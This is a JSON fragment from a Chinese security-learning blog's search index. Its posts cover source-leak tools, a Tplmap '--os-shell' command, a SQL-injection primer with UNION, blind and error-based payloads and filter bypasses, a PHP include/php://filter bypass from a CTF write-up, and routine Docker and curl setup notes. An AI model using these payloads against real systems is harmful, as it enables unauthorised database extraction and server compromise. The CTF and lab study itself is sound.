class 文件，包括 servlet class 和非servlet class /WEB-INF/lib/ 存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件 /WEB-INF/src/ 源码目录，按照包名结构放置各个java文件 /WEB-INF/database.properties 数据库配置文件 CVS泄露","categories":[],"tags":[]},{"title":"ripper,tplmap,GitHack安装","slug":"ripper-tplmap-GitHack安装","date":"2020-10-31T13:58:16.000Z","updated":"2020-10-31T14:10:07.751Z","comments":true,"path":"2020/10/31/ripper-tplmap-GitHack安装/","link":"","permalink":"http://example.com/2020/10/31/ripper-tplmap-GitHack%E5%AE%89%E8%A3%85/","excerpt":"ripper ripper是一款源码泄露利用工具； 使用范围：.git .svn .hg 泄露； 安装方法使用docker安装； 使用docker安装是因为此方式方便快捷 1234安装：sudo docker pull k0st&#x2F;alpine-dvcs-ripper启动：sudo docker run -i -t --rm k0st&#x2F;alpine-dvcs-ripper bash使用（以.svn泄露为例）：rip-svn.pl -u URL&#x2F;.svn&#x2F;退出：exit","text":"ripper ripper是一款源码泄露利用工具； 使用范围：.git .svn .hg 泄露； 安装方法使用docker安装； 使用docker安装是因为此方式方便快捷 1234安装：sudo docker pull k0st&#x2F;alpine-dvcs-ripper启动：sudo docker run -i -t --rm k0st&#x2F;alpine-dvcs-ripper bash使用（以.svn泄露为例）：rip-svn.pl -u URL&#x2F;.svn&#x2F;退出：exit GitHacker 安装 使用 进入目录，执行脚本 Tplmap Tplmap 是ssti模板注入检测攻击工具 python2环境 ubuntu 安装 git clone https://github.com/epinna/tplmap.git 开始命令 cd tplmap./tplmap.py -u ‘URL’ –os-shell 退出 ctl+c 错误解决 安装yaml即可 sudo apt-get install python-yaml 安装requests pip install requests","categories":[],"tags":[]},{"title":"SQL注入基础","slug":"SQL注入基础","date":"2020-10-14T04:47:08.000Z","updated":"2020-10-14T07:08:57.726Z","comments":true,"path":"2020/10/14/SQL注入基础/","link":"","permalink":"http://example.com/2020/10/14/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/","excerpt":"注入类型SQL注入有许多类型：按参数分类有：数字型注入与字符型注入； 按返回结果分类有： 报错注入 盲注入；","text":"注入类型SQL注入有许多类型：按参数分类有：数字型注入与字符型注入； 按返回结果分类有： 报错注入 盲注入； 注入操作 判断数字型注入与字符型注入id=1 正确id=1’ 错误id=1 and 1=1 正确id=1 and 1=2 错误则根据上述情况一般可以确定为数字型注入；字符型注入要注意闭合的符号，可能有单引号，双引号，括号等；形式多样注意巧妙辨别； 注入的一般语句使用 order by 确定字段数 并判断回显位置；查库名 id= -1 union select schema_name from information_schema.schemata –+查某库所有表名 id=-1 union select group_concat(table_name) from information_schema.tables where table_schema=”库名” –+查表中所有字段 id= -1 union select group_concat(column_name) from information_schema.columns where table_schema=”库名” and table_name=”表名” –+查字段的值 id=-1 union select 字段名 from 表名 –+ 盲注入 盲注入分为：基于时间盲注入与基于布尔的盲注入； 相关函数： sleep() 延时返回 substr(string,n,m)从字符串的第n个位置开始截取m个字符 if(expr1,expr2,expr3) 当expr1正确时执行expr2,否则执行expr3; 基于布尔的盲注入：当页面子只返回查询的正确与错误，而不反回具体内容时适用； id=1 and length(database())&gt;n –+ 判断数据库的名字长度； id=1 and substr(database(),1,1)&gt;’字符’ –+ 判断数据库名字； id=1 and substr((select table_name from information_schema.tables where table_schema=datbase() limit 0,1), 1, 1 )=’字符’ –+ 判断表名； id=1 and substr((select column_name from information_schema.columns where table_schema=datbase() and table_name=’表名’ limit 0,1), 1, 1 )=’字符’ –+ 判断字段； id=1 and substr((select 字段 from 表名 limit 0,1))=’’ –+ 判断值； 延时注入：适用与页面回显不变时； id=1 and if((database()=’’),sleep(3),null)；其余类似只需要改变判断条件即可； 报错注入（利用数据库的报错信息来获取我们需要的东西） 函数 作用 count() 统计select 返回的记录条数 concat() 字符串连接功能 floor() 向下取整 rand() 生成0~1 之间的随机浮点数 group by 根据一个或多个列对结果进行排序 floor(rand(0)*2) 产生随机数0或1 updatexml() mysql 5.1.5 extractvalue() mysql 5.1.5 函数利用 id=1 and select count(*), concat( (…) , 0x7e , floor(rand(0)*2))x from information_schema.tables group by x –+； id=1 and select 1 from (select counut(*), concat( (….) , 0x7e , floor(rand(0)*2) )x from information_schema.tables group by x )a –+； id=1 and extractvalue(1, concat(0x7e,(….),0x7e)) –+ 报错信息最多32位； id=1 and updatexml(1,concat(0x7e,(…),0x7e ),1) –+ 报错信息最多32位； 格式化注入 sprintf()将格式化字符串写入变量中； sprintf(format,arg1,arg2,arg++) arg1,arg2,arg++会被插入到主字符串中的%处，该函数逐步执行，若%多于arg参数，则必须使用占位符，占位符位于%后且由数字与$组成； 该函数的php源码中只对15种类型的字符做了匹配，其他字符直接break跳出，这样它就可以吃掉转义字符,若%后有\\，那么PHP会把\\当作一个格式化字符的类型而吃掉,最后%\\或%1$\\被替换为空； addslashes() 在单引号，双引号，反斜杠，NULL 前加反斜杠进行转义； 输入 %1$’ 变成 %1$&#39; 单引号成功逃逸； 绕过 双写绕过；oorr ununionion seselectlect …… 大小写绕过 编码绕过:URL全编码（由于服务器会对URL编码进行一次解码，所以需要编码两次）； 内联注释绕过","categories":[],"tags":[]},{"title":"python的requests库应用","slug":"python的requests库应用","date":"2020-10-13T14:24:20.000Z","updated":"2020-10-13T14:25:07.743Z","comments":true,"path":"2020/10/13/python的requests库应用/","link":"","permalink":"http://example.com/2020/10/13/python%E7%9A%84requests%E5%BA%93%E5%BA%94%E7%94%A8/","excerpt":"Python requests库基本操作","text":"Python requests库基本操作 1234567891011121314#发送get请求：response = requests.get(url,params= )#发送Post请求：response = requests.post(url,data= ) #获取正文内容：print(response.text)#获取响应状态码print(response.status_code)#定制请求头部response = requests.post(url,headers= ) #修改cookiesresponse = requests.post(url , cookies= )#设置请求超时的时间response = requests.post(url, timeout= 0.001) 基本说明 属性 说明 r.status_code HTTP请求的返回状态 r.text HTTP响应内容的字符串形式，即url对应的页面内容 r.encoding 从HTTP header中猜测的响应内容编码 r.apparent_encoding 从内容中分析出的响应内容编码方式 r.content HTTP响应内容的二进制形式（图片的还原）","categories":[],"tags":[]},{"title":"Curl分片下载","slug":"Curl分片下载","date":"2020-10-12T04:37:58.000Z","updated":"2020-11-18T14:12:46.533Z","comments":true,"path":"2020/10/12/Curl分片下载/","link":"","permalink":"http://example.com/2020/10/12/Curl%E5%88%86%E7%89%87%E4%B8%8B%E8%BD%BD/","excerpt":"2020 年 天翼杯签到题题目描述：赛方给出了一个6G的大文件让我们下载，但是速度只有几k，明显不可能靠下载完成获取flag","text":"2020 年 天翼杯签到题题目描述：赛方给出了一个6G的大文件让我们下载，但是速度只有几k，明显不可能靠下载完成获取flag 当时看见这签到提的时候完全不会，毫无头绪，比赛完才看见大佬说需要使用curl分片下载curl分片下载前提服务器需要支持 HTTP Range Request，可以用curl查看请求头，例如： curl -I http://mirrors.ustc.edu.cn/debian-cd/amd64/ios-cd/debian-mac-9.3.0-amd64-netinst.iso若返回结果内包含：Accept-Ranges:bytes ，则说明这个服务器是支持 HTTP Range Request的；若结果不包含，则可能不支持；若结果包含Accept-Ranges:none 则表示不支持； 下载 curl --range 0-5000000000 -o part1 &lt;url&gt; –range 指定下载的某一片段；此处指定的片段大小约为50G左右； 合并拼接 cat part1 part2 &gt; outputfile 此处应该注意片段文件的顺序拼接的方法有cat和dd，cat比较简单，容易使用；","categories":[],"tags":[]},{"title":"ubuntu安装Docker","slug":"ubuntu安装Docker","date":"2020-10-12T04:36:18.000Z","updated":"2020-10-12T04:54:15.581Z","comments":true,"path":"2020/10/12/ubuntu安装Docker/","link":"","permalink":"http://example.com/2020/10/12/ubuntu%E5%AE%89%E8%A3%85Docker/","excerpt":"安装123456789101112sudo apt-get updatesudo apt-get -y install apt-transport-https ca-certificates curl software-properties-common # step 2: 安装GPG证书curl -fsSL http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu&#x2F;gpg | sudo apt-key add - # Step 3: 写入软件源信息sudo add-apt-repository &quot;deb [arch&#x3D;amd64] http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu $(lsb_release -cs) stable&quot; # Step 4: 更新并安装Docker-CEsudo apt-get -y updatesudo apt-get -y install docker-ce #设置开机自启 docker开机自启：sudo systemctl enable docker.service容器开机自启：启动容器时加上 –restart=always","text":"安装123456789101112sudo apt-get updatesudo apt-get -y install apt-transport-https ca-certificates curl software-properties-common # step 2: 安装GPG证书curl -fsSL http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu&#x2F;gpg | sudo apt-key add - # Step 3: 写入软件源信息sudo add-apt-repository &quot;deb [arch&#x3D;amd64] http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu $(lsb_release -cs) stable&quot; # Step 4: 更新并安装Docker-CEsudo apt-get -y updatesudo apt-get -y install docker-ce #设置开机自启 docker开机自启：sudo systemctl enable docker.service容器开机自启：启动容器时加上 –restart=always 换源12345678sudo mkdir -p &#x2F;etc&#x2F;dockersudo tee &#x2F;etc&#x2F;docker&#x2F;daemon.json &lt;&lt;-&#39;EOF&#39;&#123; &quot;registry-mirrors&quot;: [&quot;https:&#x2F;&#x2F;xx0cvw91.mirror.aliyuncs.com&quot;]&#125;EOFsudo systemctl daemon-reloadsudo systemctl restart docker","categories":[],"tags":[]},{"title":"Docker搭建webgoat","slug":"Docker搭建webgoat","date":"2020-10-12T04:35:16.000Z","updated":"2020-10-12T04:54:23.036Z","comments":true,"path":"2020/10/12/Docker搭建webgoat/","link":"","permalink":"http://example.com/2020/10/12/Docker%E6%90%AD%E5%BB%BAwebgoat/","excerpt":"虚拟机：Ubuntu18 服务器版","text":"虚拟机：Ubuntu18 服务器版 开始搭建 在虚拟机上安装docker； $ sudo docker search webgoat 查找webgoat镜像； $ sudo docker pull webgoat/webgoat-8.0 拉取镜像； $ sudo docker run -dt --name webgoat -p 8080:8080 --rm webgoat/webgoat-8.0 开启镜像服务； 使用浏览器访问：ip:8080/WebGoat 即可； 自己创建账户登录，即可使用，全英文界面可能对和我一样的英语白痴来说不太友好； 网上看到一些其他的开启镜像的方法，我使用的时候一直卡着启动不了。 联合搭建webgoat与webwolf 使用docker拉取镜像：sudo docker pull webgoat/goatandwolf 启动镜像：sudo docker run -d -p 8081:8080 -p 9090:9090 -e TZ=Europe/Amsterdam webgoat/goatandwolf 可能会出现浏览器兼容问题","categories":[],"tags":[]},{"title":"PicGo+github图床","slug":"PicGo-github图床","date":"2020-10-12T04:33:41.000Z","updated":"2020-10-12T05:34:29.269Z","comments":true,"path":"2020/10/12/PicGo-github图床/","link":"","permalink":"http://example.com/2020/10/12/PicGo-github%E5%9B%BE%E5%BA%8A/","excerpt":"PicGo安装PicGo软件；","text":"PicGo安装PicGo软件； 创建GitHub图床创建GitHub账户并且建立一个厂库，用于存储自己的图片；配置PicGo 上图的Token需要在自己的github账户上获取 然后选择最下方的创建即可； 配置成功后，之后偶尔上传图片时可能会出现错误，可以重启PicGo即可（别问为什么，玄学）","categories":[],"tags":[]},{"title":"CUTMCTF","slug":"CUTMCTF","date":"2020-10-12T04:29:03.000Z","updated":"2020-10-12T04:55:49.828Z","comments":true,"path":"2020/10/12/CUTMCTF/","link":"","permalink":"http://example.com/2020/10/12/CUTMCTF/","excerpt":"web签到","text":"web签到 步骤 打开发现需要GET传参但并未指明参数，多次尝试发现只需要传入?1即可； 传入发现需要post一个2，多次尝试发现并没有反应，于是使用burpsuite 在params里填好参数后发现2后面多了一个等号，然后就传参成功，并且发现php代码； 明显是使用PHP伪协议查看源文件即可获得flag base64解码即可 Babysqli使用burpsuite进行注入后发现空格被过滤了，使用/**/ 替代空格； 并且发现下方注释，猜测flag可能在password里面，使用SQL语句查询 发现flag，成功 Secret发现图片，并且下载图片，按文本格式打开，后发现php代码 进行代码审计，题目要求需要使用GET方式提交param1和param2,然后使用POST方式提交param1与 param2;file_get_contents($str1)是指需要str1以文件的形式写入值，is_numeric($str2)是判断str2是否为数字并且可以识别十进制和十六进制，str2需要等于2592000，sleep()函数是要程序沉睡一段时间，if(((string)$str1!==(string)$str2)&amp;&amp;(sha1($str1)===sha1($str2)))是指需要让str1与str2的字符串形式不同，并且经过sha1()后相同；绕过这些限制救可获得flag； 使用十六进制绕过sleep()函数； 使用data://text/plain;base64,U3V2aW5fd2FudHNfYV9naXJsZnJpZW5k向str2中写入内容 关于sha1()函数的绕过，网上查找到文章https://www.addon.pub/2017/10/13/CTF-sha1%E5%92%8CMD5/ Babysqli2按照传统试一试平常的注入语句，之后发现过滤了单引号，网上查询可使用斜杠转义前面的单引号； 绕过成功，但是只显示了登录成功信息，猜测多半是盲注；发现substr() mid() 等函数被过滤了，但是left()仍可以使用； 由于flag的开头为C 所以就尝试猜测flag在password中的位置 结果发现flag在第九行；之后便使用笨办法对flag进行逐个字母爆破，下方即为最终爆破结果，按照ascii码表转换为字母即可格式为 CUMTCTF{}，大括号内全为小写； 简单文件包含页面提示需要只支持本地请求，使用burpsuite，X-Forwarded-For：127.0.0.1 没有反应 然后尝试使用client-ip:127.0.0.1 成功； 发现使用了include_once()函数，并且使用了两次，该函数只能包含同一文件一次，继续网上查找方法；发现一个重复require_once()的函数的文章，是使用伪协议配合多级符号链接的办法进行绕过的； 1php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php base64解码即可","categories":[],"tags":[]}],"categories":[],"tags":[]}